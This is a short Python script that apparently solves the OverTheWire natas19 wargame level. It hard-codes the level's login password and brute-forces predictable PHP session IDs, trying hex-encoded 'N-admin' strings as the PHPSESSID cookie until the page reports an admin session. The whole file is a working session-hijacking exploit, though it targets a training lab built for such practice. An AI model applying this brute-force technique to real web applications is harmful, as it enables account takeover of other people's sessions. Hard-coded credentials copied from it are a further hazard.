#! /bin/python
import requests, string, sys, binascii, codecs
url = "http://natas19.natas.labs.overthewire.org"
username = "natas19"
password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
characters = ''.join([string.digits, string.ascii_letters])
passchar = []

s_msg = 'You are an admin'
f_msg = 'You are logged in as a regular user'

decode_hex = codecs.getdecoder("hex_codec")
encode_hex = codecs.getencoder("hex_codec")

for idnum in range(0, 640):
    idstr = ''.join([str(idnum),'-','admin'])
    sesid = binascii.hexlify(bytes(idstr, "utf-8")).decode('utf-8')
    cookie = dict(PHPSESSID=str(sesid))
    query = '/index.php?username=admin&password=test&debug'
    uri = url+query
    r = requests.get(uri, auth=(username, password), cookies=cookie)
    if(s_msg in r.text):
        print("Success {}".format(r.text))
        sys.exit()
    elif f_msg in r.text:
        print("Fail SessID# {} - {}".format(sesid, decode_hex(sesid)))
        print(cookie)